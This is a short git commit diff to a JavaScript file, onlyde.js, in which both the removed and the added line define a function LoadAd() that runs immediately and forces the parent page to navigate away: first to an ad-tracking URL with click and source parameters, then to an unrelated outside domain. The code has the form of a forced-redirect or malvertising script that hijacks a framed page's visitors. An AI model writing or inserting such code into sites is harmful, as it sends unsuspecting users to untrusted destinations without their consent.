2c8e2c735659f05c30014229f99e8ece710674c0
Zen Arkana R <zenarkanarahman@gmail.com>
2025-11-12 08:24:42 +0700

    Update onlyde.js

--- onlyde.js
+++ onlyde.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://argbq.hottspace.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=55454&s2=2183955&s5=OnDe&click_id=OnDe"; } LoadAd();
+function LoadAd() { parent.location.href="http://quinnu.com/loml"; } LoadAd();
